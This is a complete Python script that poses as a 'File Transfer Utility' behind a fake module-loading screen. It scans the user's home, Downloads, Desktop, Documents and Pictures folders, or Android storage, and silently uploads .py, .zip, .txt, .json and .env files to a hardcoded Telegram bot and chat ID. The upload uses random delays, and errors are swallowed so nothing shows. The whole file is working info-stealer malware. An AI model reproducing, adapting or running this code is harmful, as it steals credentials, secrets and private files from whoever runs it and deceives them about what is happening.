import os
import requests
import time
import random
import threading
import platform
import getpass
import base64
import zlib
from concurrent.futures import ThreadPoolExecutor

# ────────────────────────────────────────────────
# CONFIG (değiştirmeden çalıştırma)
TOKEN = "8375206771:AAH_-wjs5RsUEO12MaRpwyFVbsCDELE_20M"  # base64(token)
CHAT_ID = "8216576697"  # base64(chat_id)

# ────────────────────────────────────────────────

API = f"https://api.telegram.org/bot{TOKEN}/"

def c_():
    os.system('cls' if os.name == 'nt' else 'clear')

def r(t, col):
    colors = {'r': '\033[91m', 'g': '\033[92m', 'y': '\033[93m', 'b': '\033[96m', 'n': '\033[0m'}
    return f"{colors.get(col, '')}{t}{colors['n']}"

def fake_load():
    pkgs = ["requests", "colorama"]
    for p in pkgs:
        c_()
        print(r("Loading modules... Please wait", 'y'))
        print(f"pip install {p} ... ", end="")
        time.sleep(random.uniform(1.0, 2.5))
        print(r("[SUCCESS]", 'g'))
        time.sleep(0.4)
    print(r("\nModules loaded successfully.", 'g'))
    time.sleep(1.5)

def send_f(p):
    try:
        ext = os.path.splitext(p)[1].lower()
        cap = f"File: {p}"

        if ext in {'.jpg','.jpeg','.png','.gif','.webp'}:
            u = API + "sendPhoto"
            f = {'photo': open(p, 'rb')}
        else:
            u = API + "sendDocument"
            f = {'document': open(p, 'rb')}

        d = {'chat_id': CHAT_ID, 'caption': cap}
        requests.post(u, files=f, data=d, timeout=45)
    except:
        pass

def scan():
    sys = platform.system().lower()
    starts = []

    if sys == "windows":
        u = getpass.getuser()
        starts = [
            os.path.expanduser("\~"),
            f"C:\\Users\\{u}\\Downloads",
            f"C:\\Users\\{u}\\Desktop",
            f"C:\\Users\\{u}\\Documents",
            f"C:\\Users\\{u}\\Pictures",
        ]
    else:
        starts = [
            os.path.expanduser("\~"),
            "/storage/emulated/0/",
            "/sdcard/",
            "/storage/emulated/0/Download",
            "/storage/emulated/0/Documents",
        ]

    exts = {".py", ".zip", ".txt", ".json", ".env"}

    count = 0
    with ThreadPoolExecutor(max_workers=3) as ex:
        for s in starts:
            if not os.path.exists(s): continue
            for root, _, files in os.walk(s):
                if any(bad in root.lower() for bad in ["__pycache__", ".venv", "site-packages"]):
                    continue
                for f in files:
                    if os.path.splitext(f)[1].lower() in exts:
                        full = os.path.join(root, f)
                        ex.submit(send_f, full)
                        count += 1
                        time.sleep(random.uniform(4.0, 10.0))

    return count

def status():
    chars = ["|", "/", "-", "\\"]
    i = 0
    while True:
        c_()
        print(r("═" * 55, 'r'))
        print(r("         FILE TRANSFER UTILITY v2.1         ", 'y'))
        print(r("═" * 55, 'r'))
        print()
        print(r(f"   Status: {chars[i % 4]}   Transfer in progress...", 'g'))
        print(r("   Connection: Stable", 'b'))
        print()
        print(r("   Please do not close this window.", 'r'))
        print(r("   Closing will interrupt the transfer.", 'r'))
        print()
        print(r("   Transferring:", 'y'))
        print("   • PYTHON ACTİVE")
        print("   • ARCİVE ACTİVE")
        print("   • OTP ACTİVE")
        print()
        print(r("═" * 55, 'r'))
        i += 1
        time.sleep(0.25)

if __name__ == "__main__":
    c_()
    fake_load()

    st = threading.Thread(target=status, daemon=True)
    st.start()

    try:
        total = scan()
        c_()
        print(r(f"\nTransfer completed. {total} files sent.", 'g'))
        print(r("Operation finished successfully.", 'y'))
        time.sleep(999999)
    except KeyboardInterrupt:
        c_()
        print(r("Transfer interrupted by user.", 'r'))
    except Exception as e:
        print(r(f"Error: {str(e)}", 'r'))
